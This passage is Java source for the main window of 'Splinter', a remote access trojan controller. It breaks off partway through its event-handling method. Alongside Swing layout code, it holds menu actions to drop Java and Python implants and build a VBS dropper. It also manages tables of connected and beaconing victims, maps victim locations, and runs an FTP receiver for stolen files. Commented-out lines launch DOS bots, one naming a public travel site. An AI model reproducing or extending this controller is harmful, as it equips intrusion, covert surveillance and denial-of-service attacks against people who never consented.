/***
 * Main GUI Class
 * 
 * 
 * @author Solomon Sonya 
 */

/**
 * working on going into Frame_FileBrowser and comment this line out for the File Browser: jpnlOptionsMain.setVisible(false);
 * 
*/

package Controller.GUI;

import Controller.Drivers.*;
import Controller.Thread.*;


import Implant.*;
import Implant.FTP.FTP_ServerSocket;
import Implant.FTP.FTP_Thread_Receiver;
import Implant.Payloads.Frame_SpoofUAC;
import Implant.Payloads.MapNetworkInterface;
import Implant.Payloads.MapSystemProperties;
import Implant.Payloads.Frame_Render_Captured_Screen;
import Implant.Payloads.Worker_Thread_Payloads;
import Implant.Payloads.DOS_Bot.FTP_DOS_Bot.DOS_Bot_FTP_Director;



import java.awt.Frame;

import javax.imageio.ImageIO;
import javax.swing.JFrame;
import java.awt.Dimension;
import javax.swing.*;
import java.lang.*;
import java.awt.Frame;
import javax.swing.border.*;

import java.awt.*;

import javax.swing.Icon;
import javax.swing.ImageIcon;
import javax.swing.JCheckBox;
import javax.swing.JFileChooser;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.SwingConstants;
import java.awt.Rectangle;
import java.awt.BorderLayout;
import javax.swing.JLabel ;
import java.lang.*;
import java.awt.Label;
import java.awt.event.KeyEvent;
import java.awt.Panel;
import java.awt.SystemColor;
import javax.swing.JRadioButton;
import java.text.*;
import java.util.*;
import java.awt.Font;
import java.awt.FlowLayout;
import java.awt.GridLayout;
import javax.swing.JPanel;
import javax.swing.JSlider;
import java.awt.event.*;
import java.awt.Point;
import javax.swing.BorderFactory;
import javax.swing.border.EtchedBorder;
import javax.swing.border.TitledBorder;
import java.awt.ScrollPane;
import javax.swing.border.BevelBorder;
import javax.swing.border.SoftBevelBorder;
import javax.swing.text.DefaultStyledDocument;
import javax.swing.text.SimpleAttributeSet;
import javax.swing.text.Style;
import javax.swing.text.StyleConstants;
import javax.swing.text.StyleContext;
import javax.swing.text.StyledDocument;
import javax.swing.JOptionPane;
import javax.swing.JTabbedPane;
import java.awt.Button;
import javax.swing.JButton;
import javax.swing.JTextField;
import java.awt.Choice;
import javax.swing.JComboBox;
import java.net.*;
import javax.swing.WindowConstants;
import javax.swing.table.*;
import java.lang.*;

import java.io.*;
import java.awt.GridBagLayout;


public class Splinter_GUI extends JFrame implements ActionListener
{
	String strMyClassName = this.getName();
	
	
	MapSystemProperties systemMap = null;
	
	
			
	
	
	public static FTP_ServerSocket ftpServerSocket = null;
	
	
	
	JMenuBar jmb = new JMenuBar();	
		JMenu jmnuFile = new JMenu("File");
			JMenuItem jmnuitm_Exit = new JMenuItem("Exit       ");	
			
		JMenu jmnuExploit = new JMenu("Exploit ");
			JMenu jmuImplant = new JMenu("Implant                    ");
				JMenuItem jmuitm_DropJavaImplant = new JMenuItem("Drop Java Implant                 ");
				JMenuItem jmuitm_DropPythonImplant = new JMenuItem("Drop Python Implant             ");
				JMenuItem jmuitm_CreateDropper = new JMenuItem("Create  Implant Dropper             ");
	
	private JTabbedPane tabbedPane_Main;
	private JTabbedPane tabbedPane_IMPLANTS;
	static private JTable_Solomon jtblConnectedAgents, jtblDisconnectedAgents, jtblBeaconingAgents, jtblLoggieAgents;
	public static JPanel_MainControllerWindow jpnlMainController;
	public static JPanel_MainControllerWindow jpnlBeaconCommandsControllerWindow;
	private JPanel_MainControllerWindow jpnlChatTerminal;
	public static Thread_ServerSocket thdServerSocket = null;
	public static Thread_JLabels thdWorkerJLabels = null;
	
	
	
	
	private JPanel jpnlMain;
	
	JSplitPane jspltPne_JTbl_And_Console = null;
	JSplitPane jspltPne_Main = null; 
	
	JPanel jpnlTab_ConnectedImplants_Main = new JPanel();
	private JPanel jpnlHeading = new JPanel(new BorderLayout());
	private JPanel jpnlServerSocketSettings_Title = new JPanel(new GridLayout(4,1));
	private JPanel jpnlJTable_Title = new JPanel(new BorderLayout());
	private JPanel jpnlJTable_DisconneectedImplants_Title = new JPanel(new BorderLayout());
	private JPanel jpnlJTable_BeaconingImplants_Title = new JPanel(new BorderLayout());
	private JPanel jpnlJTable_LoggingAgents_Title = new JPanel(new BorderLayout());
	private JPanel jpnlConsoleOut_Title = new JPanel(new BorderLayout());
	private JPanel jpnlConnectedImlants_Title = new JPanel();
	JPanel jpnlConnectionTab = new JPanel(new BorderLayout());
	
	JCheckBox jcbAutoScrollConsoleOut = new JCheckBox("Auto Scroll Console Out", true);
	JButton jbtnClearConsoleOut = new JButton("Clear Console Out");
	
	JComboBox jcbAppearance;
	JComboBox jcbFontSize;
		String [] arrTextSizes = new String[]{"Text Size", "12", "14", "16", "18", "20", "24", "26", "28", "30"};
	
	public JLabel jlblCurrentTime = new JLabel("0:0:0");
	public JLabel jlblZuluTime = new JLabel("0:0:0");
		
	public static JPanel_TextDisplayPane jtxtpne_ConsoleOut;
	JScrollPane jscrlPne_ConsoleOut;
	
	JLabel jlblImplant = new JLabel("Implant:");
	
	JPanel jpnlLogo = new JPanel();
	JLabel jlblLogo = new JLabel();
	
	JPanel jpnlConnectionStatus_1 = new JPanel(new BorderLayout());
	JPanel jpnlConnectionStatus_2 = new JPanel(new BorderLayout());
	JPanel jpnlConnectionStatus_3 = new JPanel(new BorderLayout());
	JPanel jpnlConnectionStatus_4 = new JPanel(new BorderLayout());
	
	
	JPanel jpnlNetworkInterface = new JPanel();
		JLabel jlblSelectNetworkInterface = new JLabel("Select Network Interface Adapter:         ");
		JComboBox jcbNetworkInterface = new JComboBox();
		JButton jbtnRefreshNetworkInterfaceList = new JButton ("Refresh Interfaces");
	
	JPanel jpnlServerSettings = new JPanel();
			JPanel jpnlServerSocket = new JPanel();			
				JLabel jlblEstablishServerSocket = new JLabel("Port to Establish Implant ServerSocket:  ");
				//JButton jbtnOpen_Close_ServerSocket_Toggle = new JButton("Establish ServerSocket");
				public boolean serverSocketOpen = false;
				JTextField jtfServerSocketPort = new JTextField(12);
				JButton jbtnEstablishServerSocket;//
				JButton jbtnCloseServerSocket;
				
			JPanel jpnlFTP = new JPanel();
				JLabel jlblFTP_Port = new JLabel("Port to Establish FTP ServerSocket:        ");
				JTextField jtfPort_FTP = new JTextField("12");
				
				
				public static JLabel jlblFTP_Status_Text = new JLabel("              Established FTP Port:", JLabel.RIGHT);
				public static JLabel jlblFTP_Status = new JLabel("CLOSED", JLabel.LEFT);
				JButton jbtnOpenFTP =  null;
				JButton jbtnCloseFTP =  null;
				JCheckBox jcbAutoAcceptFTP_Files = new JCheckBox("Auto Accept Files", false);
				
		JCheckBox jcbEnableLogging = new JCheckBox("Logging is Enabled", true);
				
				static JButton jbtnFTP_FileHive = new JButton("FTP FileHive");
				
				
				
				JPanel jpnlNorth = new JPanel(new BorderLayout());
				
				private JPanel jpnlSouth = new JPanel(new GridLayout(1,1));
					JPanel jpnlHeapSize_Alignment = new JPanel(new BorderLayout());
						JPanel jpnlHeapSize = new JPanel();
							JLabel jlblHeapSize_Current_Text = new JLabel("Current Heap Size: ", JLabel.RIGHT);
							JLabel jlblHeapSize_Available_Text = new JLabel("Available Heap Space: ", JLabel.RIGHT);
							JLabel jlblHeapSize_Consumed_Text = new JLabel("Consumed Heap Space: ", JLabel.RIGHT);
							JLabel jlblHeapSize_Max_Text = new JLabel("Max Heap Size: ", JLabel.RIGHT);
							JLabel jlblUpTime_Text = new JLabel("Up Time: ", JLabel.RIGHT);
							
							JLabel jlblHeapSize_Current = new JLabel("N/A ", JLabel.LEFT);
							JLabel jlblHeapSize_Available = new JLabel("N/A ", JLabel.LEFT);
							JLabel jlblHeapSize_Consumed = new JLabel("N/A ", JLabel.LEFT);
							JLabel jlblHeapSize_Max = new JLabel("N/A ", JLabel.LEFT);
							JLabel jlblUpTime = new JLabel("Up Time: ", JLabel.RIGHT);
//							JLabel jlblUptime_Days = new JLabel("00", JLabel.LEFT);
//							JLabel jlblUptime_Hours = new JLabel("00", JLabel.LEFT);
//							JLabel jlblUptime_Minutes = new JLabel("00", JLabel.LEFT);
//							JLabel jlblUptime_Secondss = new JLabel("00", JLabel.LEFT);
							
				private JPanel jpnlConnectionStatus = new JPanel();
				//private JPanel jpnlConnectionStatus = new JPanel(new GridLayout(1,8));
					static JLabel jlblServerSocketStatus_text = new JLabel("Status of Server Socket: ");
					public static JLabel jlblServerSocketStatus = new JLabel("CLOSED");
					public static JLabel jlblEstablishedPort_text = new JLabel("              Established Port: ", JLabel.RIGHT);
					public static JLabel jlblEstablishedPort = new JLabel("NOT ESTABLISHED ", JLabel.LEFT);
					public static JLabel jlblNumberConnectedImplants_Text = new JLabel("              Connected Implants: " , JLabel.RIGHT);
					public static JLabel jlblNumberConnectedImplants = new JLabel("0 " , JLabel.LEFT);
					public static JLabel jlblLHOST_ME_IP_Text = new JLabel("                LHOST (MY) IP:", JLabel.RIGHT);
					public static JLabel jlblLHOST_ME_IP = new JLabel("SOCKET CLOSED", JLabel.LEFT);
				
			
				JPanel jpnlConnectToImplant = new JPanel();			
					JLabel jlblConnectToImplant_IP = new JLabel("Enter Address to Connect to Host:         ");
					JLabel jlblConnectToImplant_Port = new JLabel("  Host Port Number: ");
					JLabel jlblBindingOption = new JLabel("  Bind to: ");
					String strBindingOption = "Select Binding Option                 ";
					String strBindToImplant = "Bind to Implant";
					String strBindToController = "Bind to Controller";
					String strBindToRelay = "Bind to Relay";
					String strBindToCortana = "Bind to Cortana";
					String [] arrBindingOptions = new String[]{strBindingOption, strBindToImplant, strBindToController, strBindToRelay, strBindToCortana};
					JComboBox jcbBindingOption = null;
					JButton jbtnBindToSingleHost = null;
					JButton jbtnBindToMultipleHosts = null;
					JTextField jtfIP_Address_To_Implant = new JTextField(12);
					JTextField jtfPort_Address_To_Implant = new JTextField(10);
					JButton jbtnBindToImplant;//
					JButton jbtnConnectToController;
					
		JSplitPane jspltpne_BeaconTerminal = null;
			JScrollPane jscrlpneBeaconCommands = null;
				JPanel jpnlBeaconCommands = new JPanel(new GridLayout(1,1));
					JPanel_BeaconCommand beaconCommand = new JPanel_BeaconCommand();
					 
			
		
	/*JPanel_TextDisplayPane txtpne_broadcastMessages;
	private JScrollPane jscrlPne_BroadcastMessage;
	private JPanel jpnlConnectedClients;
	
	public JButton jbtnSend;
	public JTextField jtfCommand = new JTextField(20);
	JPanel jpnlSend = new JPanel();
	
	JPanel jpnlMessage_Text_And_ActionButton = new JPanel(new BorderLayout());
	
	JLabel jlblConnectedClients_Text = new JLabel("Connected Clients", JLabel.CENTER);
	DefaultListModel dfltLstMdl_ConnectedClients = new DefaultListModel();
	JList jlstConnectedClients = new JList(dfltLstMdl_ConnectedClients);		
		JScrollPane jscrlPne_ConnectedClients = new JScrollPane(jlstConnectedClients);
	
		
		String strConnectedClientsToolTip = "<html>" 	+ " Select the Client you wish to send a <b> PRIVATE </b> message to."
														+ "<br>" + 	"Hold down the [CTRL] key to select multiple Clients." 
														+ "<br>" + "If no clients are selected, the message will be broadcasted to all connected Clients" 
														+ "</html>";
	JPanel jpnlSouth_ConnectedClients = new JPanel(new GridLayout(2,1));
		JButton jbtnPrivate;
		JPanel jpnlPrivateChatOptions = new JPanel();
		JRadioButton jrbPrivateFrame = new JRadioButton("Private Frame", true);
		JRadioButton jrbPrivateTab = new JRadioButton("Private Tab");
		ButtonGroup btngrp = new ButtonGroup();*/
	
	
	public Splinter_GUI() 
	{
		try
		{
			
			
			
			setTitle(Driver.TITLE);
			setColorScheme(1);
			Driver.alConnectedFTPClients = new ArrayList<FTP_Thread_Receiver>();
			Driver.instance_loaded_CONTROLLER = true;
			
			//MapSystemProperties systemMap = new MapSystemProperties(true);
			try	
			{	//RAT ICON
				java.net.URL url_Img = Splinter_GUI.class.getResource("/Controller/Images/RAT_Icon.gif");//Use this line to search for a specified file within the jar file
				//this.setIconImage(new ImageIcon(Splinter_GUI.class.getResource("/Controller/Images/RAT_Icon.gif")).getImage());
				
				Controller.Drivers.Drivers.imgFrameIcon = new ImageIcon(Splinter_GUI.class.getResource("/Controller/Images/RAT_Icon.gif")).getImage();
				this.setIconImage(Drivers.imgFrameIcon);
				
			}catch(Exception e){}
			
			
			
			try 
			{	
			    UIManager.setLookAndFeel("com.sun.java.swing.plaf.windows.WindowsLookAndFeel");	
			} 
			catch (Exception e) 
			{
			   // handle exception
			}
			
			Drivers.alTerminals = new ArrayList<Thread_Terminal>();
			Driver.alRandomUniqueImplantIDs = new ArrayList<Long>();//each terminal connected will be given a unique num!
			
			
			getContentPane().setLayout(new BorderLayout(0, 0));
			
			populateJMenu();
			
			
			/*Render_Captured_Screen screenRecord = new Render_Captured_Screen(new File("C:\\Users\\Qoheleth\\Desktop\\FTP\\192.168.137.1_9000\\SCREEN CAPTURE"), true);
			screenRecord.setVisible(true);*/
			
			//Worker_Thread_Payloads worker = new Worker_Thread_Payloads(200, null,Worker_Thread_Payloads.PAYLOAD_RENDER_SCREEN, null, "", 1, new File("C:\\Users\\Qoheleth\\Desktop\\FTP\\192.168.137.1_9000\\SCREEN CAPTURE"));
			
			//Worker_Thread_Payloads worker2 = new Worker_Thread_Payloads(200, null,Worker_Thread_Payloads.PAYLOAD_RENDER_SCREEN, null, "", 1, new File("C:\\Users\\Qoheleth\\Desktop\\FTP\\192.168.137.1_10000\\SCREEN CAPTURE"));
			
			/*jpnlMain = new JPanel();
			getContentPane().add(jpnlMain);
			jpnlMain.setLayout(null);*/
			getContentPane().setLayout(new BorderLayout());
			
			this.setBounds(60, 100, 1240, 750);
//jpnlMain.setBorder(new BevelBorder(BevelBorder.RAISED, null, null, null, null));
			
			
			//Initialize JTabbedPane
			initializeJTabbedPane();
			
			//initialize Settings Tab
			//initializeSettings();
			
			//initialize MainController window
			initializeControllerWindow();
			
			//initializeBroadcastMessage
			//initializeBroadcastMessages();
			
			//add Logo!
			try
			{
				java.net.URL url_Img = Splinter_GUI.class.getResource("/Controller/Images/RAT_Logo.gif");//Use this line to search for a specified file within the jar file				
				
				this.jlblLogo.setIcon(new ImageIcon(Splinter_GUI.class.getResource("/Controller/Images/RAT_Logo.gif")));
				
				this.jpnlLogo.add(jlblLogo);
				
				//this.jpnlLogo.setPreferredSize(new Dimension(100,72));
				this.jpnlHeading.add(BorderLayout.EAST, jpnlLogo);
			}catch(Exception e){}
			
			
			
			/*Frame_PrivateTerminal fram = new Frame_PrivateTerminal();
			fram.setVisible(true);*/
			
			
			jtfIP_Address_To_Implant.addActionListener(this);
			//jtfServerSocketPort.setBounds(162, 6, 102, 20);
			jtfServerSocketPort.addActionListener(this);
			jtfPort_Address_To_Implant.addActionListener(this);
			
			//register the Refresh button from the JTable and handle it here
			this.jtblConnectedAgents.jbtnRefresh.addActionListener(this);//I find this pretty cool!
			jtblDisconnectedAgents.jbtnRefresh.addActionListener(this);//I find this pretty cool!
			this.jtblBeaconingAgents.jbtnRefresh.addActionListener(this);//I find this pretty cool!
			jtblLoggieAgents.jbtnRefresh.addActionListener(this);
			jtblDisconnectedAgents.jbtnDisconnectImplant.setVisible(false);
			this.jtblBeaconingAgents.jbtnDisconnectImplant.setVisible(false);
			this.jtblBeaconingAgents.jbtnGoogleMap.setVisible(false);
			this.jtblBeaconingAgents.jbtnRefresh.setVisible(false);
			this.jtblBeaconingAgents.jcbEnableGPS_Resolution.setVisible(false);
			
			jtblDisconnectedAgents.jbtnClear.addActionListener(this);
			jtblDisconnectedAgents.jbtnClear.setVisible(true);
			
			jtblLoggieAgents.jbtnDisconnectImplant.setVisible(true);
			jtblLoggieAgents.jbtnDisconnectImplant.addActionListener(this);
			//this.jtblLoggieAgents.jbtnDisconnectImplant.setVisible(false);
			this.jtblLoggieAgents.jbtnGoogleMap.setVisible(false);
			//this.jtblLoggieAgents.jbtnRefresh.setVisible(false);
			this.jtblLoggieAgents.jcbEnableGPS_Resolution.setVisible(false);
			
			jtblDisconnectedAgents.jbtnRefresh.setVisible(false);
			this.jtblConnectedAgents.jbtnDisconnectImplant.addActionListener(this);//I find this pretty cool!
			jtblConnectedAgents.jbtnRefresh.setEnabled(false);
			jtblConnectedAgents.jbtnDisconnectImplant.setEnabled(false);
			
			jtblBeaconingAgents.jbtnDisconnectImplant.setEnabled(false);
			jtblBeaconingAgents.jbtnRefresh.setEnabled(false);
			
			jtblConnectedAgents.jbtnGoogleMap.setEnabled(false);
			jtblConnectedAgents.jbtnGoogleMap.addActionListener(this);
			jtblDisconnectedAgents.jbtnGoogleMap.setVisible(false);
			
			
			jtblConnectedAgents.jcbEnableGPS_Resolution.addActionListener(this);
			jtblDisconnectedAgents.jcbEnableGPS_Resolution.setVisible(false);
			
			jcbAppearance.addActionListener(this);
			jcbFontSize.addActionListener(this);
			
			this.jcbAppearance.setToolTipText("Appearance: Sets the Color Scheme");
			this.jcbFontSize.setToolTipText("Text Size: Sets the size of the characters displayed on the screen");
			
			/*System.out.println("*******************************************************************************");
			System.out.println("*     " + Drivers.NICK_NAME + " vers " + Drivers.VERSION + " - BETA" + " Programmed by Solomon Sonya and Nick Kulesza   *");
			System.out.println("*******************************************************************************");
			*/
			
			
			if(Drivers.jtxtpne_CnslOut != null)
			{
				/*Drivers.jtxtpne_CnslOut.appendString(false,  "*******************************************************************************", Drivers.clrForeground, Drivers.clrBackground);
				Drivers.jtxtpne_CnslOut.appendString(false,  "*    " + Drivers.NICK_NAME + " -RAT version " + Driver.VERSION + " - BETA" + " Developed by @Carpenter1010 - Solomon Sonya             *", Drivers.clrForeground, Drivers.clrBackground);
				Drivers.jtxtpne_CnslOut.appendString(false,  "*******************************************************************************", Drivers.clrForeground, Drivers.clrBackground);*/
				
				Driver.printConsoleWelcomeSplash(Drivers.jtxtpne_CnslOut);
			}
			
			try
			{
				Driver.startTime = System.currentTimeMillis();				
			}
			catch(Exception e)
			{
				Driver.sop("unable to store start time!");
			}
			
			Drivers.sop("Program Started.  -- Console Output Enabled: " + Drivers.outputEnabled + " -- Heap growth protection: not implemented yet");
			//Drivers.sop("NOTE: Special character to omit reading the output streams upon command execution: \"" + Splinter_IMPLANT.OMIT_READING_OUTPUT_STREAMS_UPON_COMMAND_EXECUTION + "\" e.g. executing \"start notepad\" would cause the thread to wait until the notepad process is closed. Use this as a last resort as it may be buggy right now.  To avoid waiting on a process, use the special key to execute commands like that. Thus \"" + Splinter_IMPLANT.OMIT_READING_OUTPUT_STREAMS_UPON_COMMAND_EXECUTION+ " start notepad\"");
		}
		catch(Exception e)
		{
			Drivers.eop(strMyClassName + "Constructor", strMyClassName, e, "FAIL! I wonder why I crashed.......", true);
		}		
		
		
		
		manualResizeCols_ConnectedAgents();
		manualResizeCols_DisconnectedAgents();
		
		//Just for grins... take a screen shot
		try
		{
//Drivers.captureScreen("", "" + System.currentTimeMillis() + "_screen capture");
		}catch(Exception e){}
		
		/*try
		{
			//this.jtblConnectedAgents.jcbSortTableBy.set
		}catch(Exception e){}*/
		
		intializeFTP_Panel();
		
		setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);

		Driver.myHandShake = Driver.getHandshakeData(Driver.delimeter_1);
		
		//
		//Populate Network Interface List
		//
		Drivers.refreshNetworkInterface(this.jcbNetworkInterface);
		
		//
		//Add Close Frame Action Window Listener
		//
		this.addWindowListener(new java.awt.event.WindowAdapter() 
		{
			public void windowClosing(java.awt.event.WindowEvent e) 
			{
				closeFrame(); 			
			}
		});
		
		//DOS_Bot_WEB dos_bot = new DOS_Bot_WEB("http://192.168.223.139:8080", null);//specify the port!
//		if(Drivers.jop_Confirm("Commence DOS Bot?", "DOS Bot") == JOptionPane.YES_OPTION)
//		{
//			DOS_Bot_WEB dos_bot = new DOS_Bot_WEB("192.168.223.139", 8080, null);//specify the port!
//			//DOS_Bot dos_bot = new DOS_Bot("www.travelocity.com", null);
//		}
		
		/*if(Drivers.jop_Confirm("Commence FTP DOS Bot?", "FTP DOS Bot") == JOptionPane.YES_OPTION)
		{
			LinkedList<String> queCmdList = new LinkedList<String>();
			queCmdList.addFirst("LIST");
			
			DOS_Bot_FTP_Director dos_bot = new DOS_Bot_FTP_Director("192.168.223.139", 21, 20, "anonymous", "", queCmdList, null);//specify the port!
			//DOS_Bot dos_bot = new DOS_Bot("www.travelocity.com", null);
		}*/
		
		//Worker_Thread_Payloads worker = new Worker_Thread_Payloads(Driver.CLIPBOARD_INTERRUPT_INTERVAL_MILLIS, null, 1,"farts");
		//Worker_Thread_Payloads worker = new Worker_Thread_Payloads(Driver.CLIPBOARD_INTERRUPT_INTERVAL_MILLIS, null, 0,"");
	}
	
	public boolean intializeFTP_Panel()
	{
		try
		{
			jpnlFTP = new JPanel();
			jtfPort_FTP = new JTextField("21", 12);
			
			jcbAutoAcceptFTP_Files = new JCheckBox("Auto  Accept  Files", false);
			//jbtnFTP_FileHive = new JButton("                       FTP FileHive                  ");
			jbtnFTP_FileHive = new JButton("            Set FTP FileHive           ");
			jbtnOpenFTP = new JButton("  Open FTP  ");
			jbtnCloseFTP = new JButton("  Close FTP  ");
			
			jpnlFTP.add(jlblFTP_Port);
			jpnlFTP.add(jtfPort_FTP);			
			jpnlFTP.add(jbtnOpenFTP);
			jpnlFTP.add(jbtnCloseFTP);			
			jpnlFTP.add(jbtnFTP_FileHive);
			jpnlFTP.add(jcbAutoAcceptFTP_Files);
			//jpnlFTP.setBorder(new BevelBorder(BevelBorder.RAISED, null, null, null, null));
			//jpnlConnectionStatus_1.add(BorderLayout.EAST, jpnlFTP);d
			jpnlConnectionStatus_3.add(BorderLayout.WEST, jpnlFTP);
			
			jpnlConnectionStatus.add(jlblFTP_Status_Text);
			jpnlConnectionStatus.add(jlblFTP_Status);
			
			jlblFTP_Status.setOpaque(true);
			
			jcbAutoAcceptFTP_Files.addActionListener(this);
			jbtnFTP_FileHive.addActionListener(this);
			jbtnOpenFTP.addActionListener(this);
			jtfPort_FTP.addActionListener(this);
			jbtnCloseFTP.addActionListener(this);
			
			//jlblFTP_Status_Text.setOpaque(true);
			
			jbtnOpenFTP.setToolTipText("Establish the FTP ServerSocket Receiver Thread");
			jbtnCloseFTP.setToolTipText("Close the FTP ServerSocket Receiver Thread");
			
			jcbAutoAcceptFTP_Files.setEnabled(true);
			
			return true;
		}
		catch(Exception e)
		{
			Drivers.eop("intializeFTP_Panel", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
		
	}
	
	public boolean populateJMenu()
	{
		try
		{
			this.setJMenuBar(jmb);
			
			/**
			 * FILE
			 */
			jmb.add(jmnuFile);
				jmnuFile.add(jmnuitm_Exit);
				
			/**
			 * EXPLOIT
			 */
			jmb.add(jmnuExploit);
				jmnuExploit.add(this.jmuImplant);
					jmuImplant.add(this.jmuitm_CreateDropper);
					jmuImplant.add(this.jmuitm_DropJavaImplant);
					jmuImplant.add(this.jmuitm_DropPythonImplant);
					
			
			/**
			 * REGISTER WIDGETS
			 */
			jmnuitm_Exit.addActionListener(this);
			jmuitm_DropJavaImplant.addActionListener(this);
			jmuitm_DropPythonImplant.addActionListener(this);
			jmuitm_CreateDropper.addActionListener(this);
				
			
			jmuitm_DropJavaImplant.setEnabled(false);
			jmuitm_DropPythonImplant.setEnabled(false);
			jmuitm_CreateDropper.setEnabled(true);
			
			this.validate();		
			return true;
		}
		catch(Exception e)
		{
			Drivers.eop("populateJMenu", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	public boolean manualResizeCols_ConnectedAgents()
	{
		try
		{
			this.jtblConnectedAgents.jtblMyJTbl.getColumn(Drivers.strImportantMessage_Header).setPreferredWidth(2);
			
			return true;
		}
		catch(Exception e)
		{
			Drivers.eop("manualResizeCols_ConnectedAgents", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	public boolean manualResizeCols_DisconnectedAgents()
	{
		try
		{
			this.jtblDisconnectedAgents.jtblMyJTbl.getColumn(Drivers.strDisconnectionTime_Header).setPreferredWidth(102);
			
			return true;
		}
		catch(Exception e)
		{
			Drivers.eop("manualResizeCols_ConnectedAgents", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	public boolean closeFrame()
	{
		try
		{
			if(Drivers.jop_Confirm("Close " + Drivers.NICK_NAME + "?", "Exit") == JOptionPane.YES_OPTION)
			{
				System.exit(0);
			}
			
			return false;
		}
		catch(Exception e)
		{
			Drivers.eop("closeFrame", strMyClassName, e, e.getLocalizedMessage(), false);
			System.exit(0);
		}
		
		
		
		System.exit(0);
		return true;//should have been unreachable!
	}
	
	public void actionPerformed(ActionEvent ae)
	{
		try
		{
			if(ae.getSource() == jbtnEstablishServerSocket)
			{
				establishServerSocket();
			}
			
			else if(ae.getSource() == jbtnCloseServerSocket)
			{
				closeServerSocket();
			}
			
			else if(ae.getSource() == jbtnBindToImplant)
			{
				decideConnectionAction(true);
				//connectToImplant(true, false, false, false);
			}
			
			else if(ae.getSource() == jbtnClearConsoleOut)
			{
				if(Drivers.jop_Confirm("Clear Console Out?", "Confirm Action") == JOptionPane.YES_OPTION)
				{
					this.jtxtpne_ConsoleOut.clearTextPane();
				}
					
			}
			
			else if(ae.getSource() == jcbAutoScrollConsoleOut)
			{
				this.jtxtpne_ConsoleOut.autoScroll = jcbAutoScrollConsoleOut.isSelected();
			}
			
			else if(ae.getSource() == jtfIP_Address_To_Implant)
			{
				decideConnectionAction(true);
				//connectToImplant(true, false, false, false);
			}
			
			else if(ae.getSource() == jcbEnableLogging)
			{
				Driver.isLoggingEnabled = jcbEnableLogging.isSelected();
			}
			
			else if(ae.getSource() == jtfServerSocketPort)
			{
				establishServerSocket();
			}
			
			else if(ae.getSource() == jtfPort_Address_To_Implant)
			{
				decideConnectionAction(true);
				//connectToImplant(true, false, false, false);
			}
			
			else if(ae.getSource() == jbtnConnectToController)
			{
				decideConnectionAction(true);
				//myHandShake = this.getControllerHandshakeData(Driver.delimeter_1);
				//connectToImplant(false, true, false, false);
			}
			
			else if(ae.getSource() == jtblConnectedAgents.jbtnRefresh)
			{
				Drivers.updateConnectedImplants();
				Drivers.jtblConnectedImplants.updateJTable = true;
			}
			
			else if(ae.getSource() == jtblConnectedAgents.jbtnDisconnectImplant)
			{
				disconnectSelectedAgent(-2);//-2 indicates to look through jtblConnectedAgents
			}
			
			else if(ae.getSource() == jtblLoggieAgents.jbtnDisconnectImplant)
			{
				disconnectLoggie();
			}
			
			else if(ae.getSource() == jtblConnectedAgents.jcbEnableGPS_Resolution)
			{
				try
				{
					Driver.enableGPS_Resolution = jtblConnectedAgents.jcbEnableGPS_Resolution.isSelected();
				}
				catch(Exception e)
				{
					Drivers.sop("Error attemtping to set GPS resultion state");
				}
			}
			
			else if(ae.getSource() == jtblConnectedAgents.jbtnGoogleMap)
			{
				displaySelectedImplantOnMap();
			}
			
			else if(ae.getSource() == jcbAppearance)
			{
				setColorScheme(this.jcbAppearance.getSelectedIndex());
			}
			
			else if(ae.getSource() == jcbFontSize)
			{
				setTextSize(jcbFontSize.getSelectedIndex());
			}
			
			else if(ae.getSource() == jmnuitm_Exit)
			{
				closeFrame();
			}
			
			else if(ae.getSource() == this.jmuitm_DropJavaImplant)
			{
				Driver.dropImplantFile(Driver.dropper_JavaImplantPath, Driver.jar_dropper_name);
			}
			
			else if(ae.getSource() == this.jmuitm_DropPythonImplant)
			{
				Driver.dropImplantFile(Driver.dropper_PythonImplantPath, Driver.python_dropper_name);
			}
			
			else if(ae.getSource() == jmuitm_CreateDropper)
			{
				Dialog_DropperVBS jdlgDropper = new Dialog_DropperVBS();
				jdlgDropper.show(true);
			}
			
			else if(ae.getSource() == jcbAutoAcceptFTP_Files)
			{
				Driver.autoAcceptFTP_Files = jcbAutoAcceptFTP_Files.isSelected();
				
				Drivers.sop("Auto Accept FTP Files: " + Driver.autoAcceptFTP_Files);
			}
			
			else if(ae.getSource() == jbtnFTP_FileHive)
			{
				setFTP_FileHiveDirectory();
			}
			
			else if(ae.getSource() == jbtnOpenFTP)
			{
				establishFTP();
			}
			
			else if (ae.getSource() == jtfPort_FTP)
			{
				establishFTP();
			}
			
			else if(ae.getSource() == jbtnCloseFTP)
			{
				
				closeFTP();
			}
			
			else if(ae.getSource() == jbtnBindToSingleHost)
			{
				decideConnectionAction(true);
				//Drivers.jop_Warning("Feature is coming soon...                  ", "Feature not yet implemented...");
			}
			
			else if(ae.getSource() == jbtnBindToMultipleHosts)
			{
				decideConnectionAction(false);
			}
			
			else if(ae.getSource() == jtblBeaconingAgents.jbtnClear)
			{
				Driver.alBeaconTerminals.clear();
				Drivers.updateBeaconImplants();
			}
			
			else if(ae.getSource() == jtblDisconnectedAgents.jbtnClear)
			{
				jtblDisconnectedAgents.removeAllRows();
			}
			
			else if(ae.getSource() == jtblLoggieAgents.jbtnRefresh)
			{
				jtblLoggieAgents.updateJTable = true;
			}
			
			else if(ae.getSource() == jbtnRefreshNetworkInterfaceList)
			{
				Drivers.refreshNetworkInterface(this.jcbNetworkInterface);
			}
			
			//
			//Check if it is a Beaconing Agents Command Instance
			//
			else
			{
				JPanel_BeaconCommand instance = null;
				
				for(int i = 0; i < Drivers.alBeaconCommands_GUI.size(); i++)
				{
					instance = Drivers.alBeaconCommands_GUI.get(i);
					
					//
					//ADD COMMAND
					//
					if(ae.getSource() == instance.jbtnAddBeaconCommand)
					{
						JPanel_BeaconCommand CMD = new JPanel_BeaconCommand();
						CMD.jbtnAddBeaconCommand.addActionListener(this);
						CMD.jbtnDeleteThisCommand.addActionListener(this);
						
						Drivers.alBeaconCommands_GUI.add(CMD);
						
						this.updateBeaconingCommandList_GUI();
					}
					
					//
					//DELETE COMMAND
					//
					else if(ae.getSource() == instance.jbtnDeleteThisCommand)
					{
						try
						{
							if(Drivers.alBeaconCommands_GUI.size() > 1)
							{
								Drivers.alBeaconCommands_GUI.remove(i);
								updateBeaconingCommandList_GUI();
							}
						}catch(Exception e){}
					}
					
					
				}
			}
			
			this.validate();
			
		}
